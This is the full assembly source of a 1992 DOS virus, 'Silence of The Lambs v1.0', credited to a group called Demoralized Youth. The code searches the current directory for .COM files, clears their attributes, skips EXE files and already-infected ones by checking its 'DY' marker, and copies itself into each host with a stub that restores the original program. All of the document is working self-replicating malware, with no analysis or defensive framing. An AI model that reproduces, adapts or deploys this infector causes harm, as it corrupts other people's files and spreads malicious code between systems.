;                            Silence of The Lambs v1.0
;                (c) The Chronomancer of Demoralized Youth 1992
;
;             First version : Thursday 27th of Febuary - 01:50 CET.
;

org     100h
jmp short dummy1
db      'DY'
dummy1:
        mov     cx,(100h-80h)/2                 ;save command line on stack
        mov     si,80h
        save_parm:
        push    [si]
        inc     si
        inc     si
        loop    save_parm

        mov     ah,4Eh
        xor     cx,cx
        mov     dx,offset file
        int     21h
        jc      nomore
again:
        cmp     byte [9Eh],0FAh
        jae     more
        call    infect
more:
        mov     ah,4Fh
        int     21h
        jnc     again
nomore:
        mov     cx,(100h-80h)/2
        mov     si,0FEh
rest_parm:
        pop     [si]
        dec     si
        dec     si
        loop    rest_parm

        mov     bx,0000h
eof     equ $-2
        jmp     bx

file    db '*.COM',0

infect:
        mov     bx,cs
        mov     si,cs
        dec     si
        mov     ds,si
        cmp     byte[0],'Z'
        je      ok_mark
        jmp     back2
ok_mark:
        sub     word [0003h],pgfsize
        jnc     ok_mark2
        jmp     back
ok_mark2:
        mov     ax,[0012h]
        sub     ax,pgfsize
        push    ax

        mov     ds,bx
        mov     ax,4301h
        xor     cx,cx
        mov     dx,80h+1Eh
        int     21h

        mov     ax,3D02h
        int     21h
        xchg    bx,ax

        pop     ds
        push    ds
        mov     cx,total
        xor     dx,dx
        mov     ah,3Fh
        int     21h

        cmp     byte [0],'M'   ;exe ?
        je      close
        cmp     byte [0],'Z'   ;exe ?
        je      close
        cmp     word [2],'YD'   ;allready infected?
        je      close

        xor     cx,cx
        xor     dx,dx
        push    cx
        push    dx
        mov     ax,4202h
        int     21h

        add     ax,total+100h
        mov     cs:word [00FEh],ax

        mov     ah,40h
        mov     cx,total
        xor     dx,dx
        int     21h

        push    cs
        pop     ds

        mov     ah,40h
        mov     cx,applen
        mov     dx,offset append
        int     21h

        mov     ax,4200h
        pop     dx
        pop     cx
        int     21h

        push    [eof]
        mov     ax,word [00FEh]
        mov     [eof],ax

        mov     ah,40h
        mov     dx,100h
        mov     cx,total
        int     21h

        pop     [eof]
close:
        mov     ah,3Eh
        int     21h
back:
        pop     ds              ;(mov ds,si)
        add     word [0003h],pgfsize
back2:
        push    cs
        pop     ds
        ret

append:
call    $+3
pop     si
sub     si,3+total
mov     di,100h
mov     cx,total
rep     movsb
mov     ax,100h
push    ax
ret
applen  equ $-offset append

total   equ $-100h                      ;size
pgfsize         equ ($-100h)/16+2       ;paragraphs needed















